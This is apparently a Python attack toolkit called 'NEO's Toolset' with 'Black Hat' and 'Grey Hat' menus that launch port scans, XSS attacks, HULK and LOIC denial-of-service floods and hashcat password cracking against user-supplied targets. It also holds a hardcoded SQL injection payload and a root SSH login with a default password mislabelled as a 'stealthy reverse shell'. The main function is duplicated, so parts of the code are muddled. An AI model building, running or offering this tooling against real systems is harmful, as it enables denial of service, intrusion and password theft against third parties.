import os
import socket
from bs4 import BeautifulSoup
import re
import hashlib
from colorama import init, Fore, Style
import os
import platform

import paramiko
import urllib.parse
import requests
import time
import subprocess

# Initialize colorama for cross-platform color support
init()

# Pause
def pause_and_countdown():
    # Pause for 3 seconds
    time.sleep(3)

# CLearing Console
def clear_console():
    os_name = platform.system().lower()
    if os_name == "windows":
        os.system("cls")  # For Windows
    elif os_name in ["linux", "darwin"]:
        os.system("clear")  # For Linux and macOS
    else:
        # Other operating systems that may not be supported
        print("Console clear not supported for this OS.")

# Function to perform stealthy port scanning using Masscan
def stealthy_port_scanner(target_ip):
    print(f"\n{Fore.YELLOW}Initiating Stealthy Port Scan on {target_ip}...")
    subprocess.run(["masscan", "--open", "-p1-65535", "--rate", "1000", target_ip])

# Function to perform XSS attack using XSStrike
def xss_attack(target_url):
    print(f"\n{Fore.YELLOW}Performing XSS Attack on {target_url}...")
    subprocess.run(["python3", "XSstrike/xsstrike.py", "-u", target_url])

# Function to execute an advanced DDoS attack using HULK
def advanced_ddos_attack(target_url):
    print(f"\n{Fore.YELLOW}Launching Advanced DDoS Attack on {target_url}...")
    subprocess.run(["python3", "HULK/hulk.py", "-site", target_url])

# Function to execute a DDoS attack using LOIC (Low Orbit Ion Cannon)
def ddos_attack(target_url):
    print(f"\n{Fore.YELLOW}Launching DDoS Attack on {target_url} using LOIC...")
    loic_path = "LOIC/loic.py"
    subprocess.run(["python3", loic_path, target_url])

# Function to perform advanced password cracking using Hashcat
def advanced_password_cracker(hash_file):
    print(f"\n{Fore.YELLOW}Cracking Passwords using Advanced Techniques...")
    subprocess.run(["hashcat", "-a", "0", "-m", "1000", hash_file, "rockyou.txt"])

# Function to deploy a stealthy reverse shell using Paramiko and Netcat
def stealthy_reverse_shell(target_ip, port):
    print(f"\n{Fore.YELLOW}Deploying Stealthy Reverse Shell to {target_ip}:{port}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target_ip, port=22, username="root", password="password")
        ssh_session = client.get_transport().open_session()
        ssh_session.exec_command("/bin/bash")
        print(ssh_session.recv(1024))
    except paramiko.AuthenticationException:
        print(f"{Fore.RED}Authentication failed. Check your credentials.")
    except paramiko.SSHException as e:
        print(f"{Fore.RED}SSH connection failed: {e}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")
    finally:
        client.close()

# Function to perform SQL injection attack
def sql_injection(target_url):
    print(f"\n{Fore.YELLOW}Initiating SQL Injection Attack on {target_url}...")
    payload = f"' OR '1'='1' -- "
    url = urllib.parse.urljoin(target_url, f"/vulnerable_endpoint?username={payload}")
    try:
        response = requests.get(url)
        if "Welcome admin" in response.text:
            print(f"{Fore.GREEN}SQL Injection successful! Admin privileges granted.")
        else:
            print(f"{Fore.RED}SQL Injection unsuccessful.")
    except requests.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

# Function to display the main menu
def display_main_menu():
    print(f"\n{Fore.CYAN}=== NEO's Toolset ===")
    print("Choose your path:")
    print(f"{Fore.MAGENTA}1. Black Hat Operations")
    print(f"{Fore.BLUE}2. Grey Hat Operations")
    print(f"{Fore.RED}3. Exit{Style.RESET_ALL}")

# Function to display the Black Hat operations menu
def display_black_hat_menu():
    clear_console()
    print("=" * 40)
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "=== Black Hat Operations ===" + " " * 5 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "Choose your tool:" + " " * 16 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "1. Stealthy Port Scanner" + " " * 9 + "|")
    print("|" + " " * 5 + "2. XSS Attack" + " " * 20 + "|")
    print("|" + " " * 5 + "3. Advanced DDoS Attack" + " " * 10 + "|")
    print("|" + " " * 5 + "4. DDoS Attack" + " " * 19 + "|")
    print("|" + " " * 5 + "5. Advanced Password Cracker" + " " * 5 + "|")
    print("|" + " " * 5 + "6. Back" + " " * 26 + "|")
    print("|" + " " * 38 + "|")
    print("=" * 40)

# Function to display the Grey Hat operations menu
def display_grey_hat_menu():
    clear_console()
    print("=" * 40)
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "=== Grey Hat Operations ===" + " " * 6 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "Choose your tool:" + " " * 16 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "1. Stealthy Port Scanner" + " " * 9 + "|")
    print("|" + " " * 5 + "2. XSS Attack" + " " * 20 + "|")
    print("|" + " " * 5 + "3. Advanced DDoS Attack" + " " * 10 + "|")
    print("|" + " " * 5 + "4. Advanced Password Cracker" + " " * 5 + "|")
    print("|" + " " * 5 + "5. Back" + " " * 26 + "|")
    print("|" + " " * 38 + "|")
    print("=" * 40)

# Main function to manage user interaction
def main():
    while True:
        display_main_menu()
        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":  # Black Hat Operations
            while True:
                display_black_hat_menu()
                choice = input(f"{Fore.MAGENTA}Enter your choice: {Style.RESET_ALL}")

                if choice == "1":
                    target_ip = input(f"{Fore.MAGENTA}Enter target IP address: {Style.RESET_ALL}")
                    stealthy_port_scanner(target_ip)
                elif choice == "2":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    xss_attack(target_url)
                elif choice == "3":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    advanced_ddos_attack(target_url)
                elif choice == "4":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    ddos_attack(target_url)
                elif choice == "5":
                    hash_file = input(f"{Fore.MAGENTA}Enter path to hash file: {Style.RESET_ALL}")
                    advanced_password_cracker(hash_file)
                elif choice == "6":
                    break
                else:
                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
def main():
    while True:
        display_main_menu()
        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":  # Black Hat Operations
            while True:
                display_black_hat_menu()
                choice = input(f"{Fore.MAGENTA}Enter your choice: {Style.RESET_ALL}")

                if choice == "1":
                    target_ip = input(f"{Fore.MAGENTA}Enter target IP address: {Style.RESET_ALL}")
                    stealthy_port_scanner(target_ip)
                elif choice == "2":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    xss_attack(target_url)
                elif choice == "3":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    advanced_ddos_attack(target_url)
                    input("\nPress Enter to continue...")
                elif choice == "4":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    ddos_attack(target_url)
                    input("\nPress Enter to continue...")
                elif choice == "5":
                    hash_file = input(f"{Fore.MAGENTA}Enter path to hash file: {Style.RESET_ALL}")
                    advanced_password_cracker(hash_file)
                elif choice == "6":
                    break
                else:
                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")

        elif choice == "2":  # Grey Hat Operations
            while True:
                display_grey_hat_menu()
                choice = input(f"{Fore.BLUE}Enter your choice: {Style.RESET_ALL}")

                if choice == "1":
                    target_ip = input(f"{Fore.BLUE}Enter target IP address: {Style.RESET_ALL}")
                    stealthy_port_scanner(target_ip)
                elif choice == "2":
                    target_url = input(f"{Fore.BLUE}Enter target URL: {Style.RESET_ALL}")
                    xss_attack(target_url)
                elif choice == "3":
                    target_url = input(f"{Fore.BLUE}Enter target URL: {Style.RESET_ALL}")
                    advanced_ddos_attack(target_url)
                    input("\nPress Enter to continue...")
                elif choice == "4":
                    hash_file = input(f"{Fore.BLUE}Enter path to hash file: {Style.RESET_ALL}")
                    advanced_password_cracker(hash_file)
                elif choice == "5":
                    break
                else:
                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")

        elif choice == "3":  # Exit
            print(f"\n{Fore.YELLOW}Exiting NEO's Toolset. You are no longer invulnerable. Stay safe!\n")
            pause_and_countdown()
            clear_console()
            break

        else:
            print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")

if __name__ == "__main__":
    main()
